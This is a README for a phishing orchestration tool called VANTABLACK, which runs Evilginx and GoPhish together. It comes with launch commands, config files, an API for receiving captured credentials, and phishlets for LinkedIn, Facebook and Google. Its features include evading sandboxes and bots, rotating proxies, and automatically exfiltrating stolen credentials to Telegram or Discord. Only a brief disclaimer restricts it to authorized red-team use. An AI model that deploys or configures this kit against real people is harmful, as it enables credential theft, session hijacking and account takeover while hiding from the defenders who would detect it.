# 🌑 VANTABLACK: Industrial Phishing Orchestrator (V3.0)

![License](https://img.shields.io/badge/License-MIT--Industrial-black)
![Version](https://img.shields.io/badge/Version-3.0.0--Polymorph-grey)
![Security](https://img.shields.io/badge/Security-Red--Team--Ready-red)

**VANTABLACK** is an elite, ultra-resilient orchestration platform designed for Red Team professionals. It manages high-performance interception engines (**Evilginx**) and campaign managers (**Gophish**) through a centralized, cloaked nervous system.

## 🚀 Overkill Features

- **Nervous System (API)**: Real-time injection of captures via FastAPI into a secure SQLite Vault.
- **Resilience Supervisor**: Proactive monitoring of resources (CPU/RAM) with auto-restart capabilities.
- **Polymorphic Cloaking**: Advanced sandbox and bot detection (GPU/Battery fingerprinting) with zero-trace redirection.
- **Containerized Infrastructure**: "One-Click" deployment via Docker Compose with an isolated, encrypted network.
- **Automated Exfiltration**: Instant data push to Telegram (VANTABLACK Asynchronous worker).

## 📊 Monitoring & Forensics

- **Health Diagnostic**: [`check_status.py`](check_status.py) script to validate the black-site infrastructure.
- **Terminal Dashboard**: [`monitor_captures.py`](monitor_captures.py) script for live capture viewing.
- **Forensic Fingerprinting**: Detailed technical reports on attack signatures.

## 📂 Project Structure

- `vanta/`: The internal nervous system (Core modules & Sub-systems).
- `engines/`: The primary Go-based interception engines.
- `bin/`: Hardened, optimized binary distributions.
- `vanta.py`: The universal Command-Line entry point.
- `vanta_legacy.py`: Legacy standalone Control Center.

## 🛡️ Ethical Governance

The use of this tool is strictly governed by the [LICENSE](LICENSE). Any usage outside of a legal and contractual Red Teaming framework is strictly prohibited.

## 📦 Installation

### Prerequisites

- Python 3.9+
- Docker & Docker Compose
- Go (optional, for engine compilation)

### Python Dependencies

```bash
pip3 install rich pyyaml requests fastapi uvicorn psutil
```

## 🚀 Quick Start

### 1. Configure your clandestine tokens in `hitch_config.yaml`

```yaml
telegram:
  token: "YOUR_BOT_TOKEN"
  chat_id: "YOUR_CHAT_ID"

evasion:
  stealth_level: 2
  sandbox_detect: true
```

### 2. Launch the black-site infrastructure

```bash
# Docker Compose (Full containerized deployment)
docker-compose up -d --build

# Or start locally without Docker
python3 vanta.py --stealth-level 2 --notify telegram
```

### 3. Monitor operations in real-time

```bash
python3 monitor_captures.py
```

## 📖 Complete Command Reference

### VANTABLACK Orchestrator

```bash
# Basic start
python3 vanta.py

# With custom stealth level (1-5)
python3 vanta.py --stealth-level 3

# With proxy rotation
python3 vanta.py --proxy-list proxies.txt

# With Discord notifications
python3 vanta.py --notify discord

# With auto-kill on threat detection
python3 vanta.py --auto-kill

# Multi-domain management
python3 vanta.py --multi-tenant

# Full options example
python3 vanta.py --stealth-level 4 --proxy-list proxies.txt --notify telegram --auto-kill
```

### System Diagnostics

```bash
# Check infrastructure status
python3 check_status.py
```

### Live Capture Monitoring

```bash
# View captured credentials in real-time
python3 monitor_captures.py

# With limited output
python3 monitor_captures.py | head -50
```

### Docker Commands

```bash
# Start all services
docker-compose up -d

# View logs
docker-compose logs -f

# Stop all services
docker-compose down

# Rebuild and start
docker-compose up -d --build

# Restart specific service
docker-compose restart vanta-nervous-system
```

### Git Operations

```bash
# Initialize git repository
git init

# Add all files
git add .

# Commit changes
git commit -m "feat: Initial VANTABLACK deployment"

# Create branch
git checkout -b feature/new-module

# Merge branch
git merge feature/new-module

# Push to remote
git push origin main

# Pull updates
git pull origin main
```

## 🎯 Engine Management

### Evilginx (Phishing Proxy)

```bash
# Start Evilginx
./bin/evilginx -p ./phishlets -developer -webhook-url http://127.0.0.1:8000/capture

# With custom config
./bin/evilginx -p ./phishlets -c ./evilginx_config.yaml
```

### GoPhish (Campaign Manager)

```bash
# Start GoPhish
./bin/gophish --config ./configs/config.json

# Background mode
nohup ./bin/gophish --config ./configs/config.json > gophish.log 2>&1 &
```

## 🔧 Configuration Files

### hitch_config.yaml

```yaml
name: "VANTABLACK"
version: "3.0.0"

telegram:
  token: "YOUR_BOT_TOKEN"
  chat_id: "YOUR_CHAT_ID"

evasion:
  stealth_level: 2
  sandbox_detect: true
  gpu_fingerprint: true
  battery_check: true

proxy:
  enabled: true
  rotation: "round-robin"
```

### configs/config.json

```json
{
  "contact_addr": "",
  "contact_port": "",
  "admin_api": {
    "listen_addr": "127.0.0.1",
    "listen_port": 3333
  },
  "phish_server": {
    "listen_addr": "0.0.0.0",
    "listen_port": 443,
    "hostname": "",
    "is_redirector": false,
    "use_https": true
  }
}
```

## 📊 API Endpoints

| Method | Endpoint | Description |
|--------|----------|-------------|
| POST | `/capture` | Receive captured credentials |
| GET | `/status` | System health check |
| GET | `/captures` | List all captures |
| DELETE | `/capture/{id}` | Delete capture |

## 🛠️ Development

### Running Tests

```bash
python3 -m pytest tests/
```

### Adding New Phishlets

Place new phishlets in the `phishlets/` directory:

```bash
ls phishlets/
linkedin.yaml
facebook.yaml
google.yaml
```

### Custom Modules

Add custom evasion modules in `vanta/modules/`:

```python
# vanta/modules/custom_evasion.py
class CustomEvasion:
    def detect(self):
        # Custom detection logic
        return False
```

## 📁 Directory Structure

```
alex 2/
├── bin/
│   ├── evilginx          # Evilginx binary
│   └── gophish           # GoPhish binary
├── configs/
│   └── config.json       # Main configuration
├── data/
│   ├── gophish.db       # GoPhish database
│   └── db/              # Database migrations
├── deployment/
│   ├── docker/          # Docker deployment files
│   └── ansible-playbook/ # Ansible deployment
├── engines/
│   ├── auth/            # Authentication modules
│   ├── controllers/     # API controllers
│   ├── core/            # Core engine logic
│   └── ...
├── phishlets/           # Phishing templates
├── redirectors/         # URL redirectors
├── static/              # Static assets
├── templates/           # HTML templates
├── vanta/
│   ├── core/
│   │   ├── orchestrator.py  # Main orchestrator
│   │   ├── supervisor.py    # Process supervisor
│   │   ├── api_listener.py  # FastAPI listener
│   │   └── db.py            # Database handler
│   ├── modules/
│   │   ├── evasion.py       # Sandboxing detection
│   │   ├── exfiltration.py # Telegram reporter
│   │   └── proxy.py         # Proxy rotation
│   └── utils/
├── docker-compose.yml   # Docker orchestration
├── vanta.py            # CLI entry point
├── check_status.py      # Health check script
├── monitor_captures.py  # Capture monitor
└── requirements.txt     # Python dependencies
```

## 🔐 Security Features

- **Polymorphic Cloaking**: Dynamic evasion techniques
- **Auto-Restart**: Supervisor monitors and restarts failed engines
- **Encrypted Vault**: SQLite database with captured data
- **Zero-Trace**: Sandboxing and bot detection enabled

## 📝 Logging

Logs are stored in:
- `VANTABLACK_PATCH.log` - Patch updates
- `VANTABLACK_TRACE.log` - Execution traces

## 🤝 Contributing

1. Fork the repository
2. Create a feature branch: `git checkout -b feature/new-feature`
3. Commit changes: `git commit -m "feat: Add new evasion technique"`
4. Push to branch: `git push origin feature/new-feature`
5. Submit a Pull Request

## 📄 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## ⚠️ Disclaimer

This tool is intended for authorized Red Team operations only. Unauthorized use is strictly prohibited.

---

**VANTABLACK: Through the Looking Glass of Security.**
